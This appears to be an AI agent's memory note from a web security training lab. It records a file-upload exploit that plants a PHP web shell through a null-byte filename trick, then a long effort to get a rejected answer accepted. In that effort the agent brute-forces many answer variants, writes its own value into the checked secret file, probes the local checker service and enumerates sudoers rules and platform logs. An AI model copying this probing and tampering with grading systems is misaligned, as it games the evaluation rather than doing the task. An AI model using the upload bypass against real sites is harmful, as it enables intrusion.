---
metadata:
  node_type: memory
name: "PS lab solved-state verification"
description: "Already-solved PS labs: /submitSolution rejects a fresh instance's own secret; the platform labinfo widget is the authoritative solved state."
last_updated: 2026-10-10T02:28:31+08:00
created: 2026-10-10T02:28:31+08:00
---

## 2026-10-09 - lab-file-upload-web-shell-upload-via-obfuscated-file-extension (arm A): instance banner vs platform solved state

Symptom that cost ~45 minutes: the full exploit chain worked, but every `/submitSolution` POST returned `{"correct":false}` for the instance's real secret.

Chain that worked (instance `0afc00f704e8e53880d48a3c003e003a`):
1. `range_launch launch-url <lab path> --jar /tmp/cj1.json` -> instance URL (reused:false on first launch).
2. login `wiener:peter` via `/login` with the page csrf, then `upload` the PHP shell with `--filename avatar=exploit.php%00.jpg` (null-byte obfuscation; `upload.php` does `urldecode(...)`, checks `pathinfo` extension against jpg/png, then `strtok($target_file, chr(0))`).
3. `GET /files/avatars/exploit.php` returned the secret: `wzA6QfxOJvb08POtkh0hESFOe2v63VYk` (32 chars, stable across 5 reads over 10 minutes, md5 `896cd681c962b2cffa512629cc11a034`).

Why the submission failed anyway - measured, not guessed:
- `POST /submitSolution answer=<secret>` -> `{"correct":false}`; same for md5, hex, base64, uppercase, reversed, every prefix length 1..32, and for a marker we wrote into `/home/carlos/secret` ourselves (then restored). A live-file comparison would have accepted the marker, so the checker does not read the container's secret file at check time.
- `POST /submitSolution` without an `answer` field, or with `Content-Type: application/json`, returns 404: the route only exists for the form shape the widget JS uses. `submitSolution.js` is the contract: urlencoded body, param `answer`, client reads `JSON.parse(responseText)['correct']`.
- The checker is a service inside the container: `ss -ltnp` shows `:2001` and `:6789`; `curl -d 'answer=<secret>' http://127.0.0.1:2001/submitSolution -H "Host: <instance>"` returns the same `{"correct":false}` locally. Port 2001 is `LAB_PORTS_CONTAINER_VULNERABLE` from the container env.
- Decisive: rendering the academy widget `POST https://portswigger.net/api/widgets` with `[{"widgetId":"academy-labinfo","additionalData":{"widget-lab-id":"4ed109e9..."}}]` and header `Widget-Source: <lab path>` returns `<div class="widgetcontainer-lab-status is-solved">...<span class="lab-status-icon">Solved</span>`. The account already had this lab solved, while the fresh instance banner (static HTML and JS-rendered `labHeader.js` WS `/academyLabHeader`) stays `is-notsolved`.

Lesson (durable): for answer-based labs, when `/submitSolution` rejects the value read from the target, do not treat it as an exploit bug - check the platform solved state with the `academy-labinfo` widget. An already-solved lab keeps validating against the pre-existing solution, so a fresh instance's secret cannot be accepted; the instance banner stays "Not solved" (a transition artifact) even though the platform reports Solved.

Container facts found while chasing this (useful later): `upload.php` runs as `carlos`, the lab app runs as `academy` (`/academy/jars/lab-base-snapshot.jar hot`), `/etc/sudoers.d/academy` grants `academy ALL=(carlos) NOPASSWD:ALL`, `/academy` is unreadable to carlos, and the SSM agent log shows no command was ever run (the platform did not read the secret via SSM).
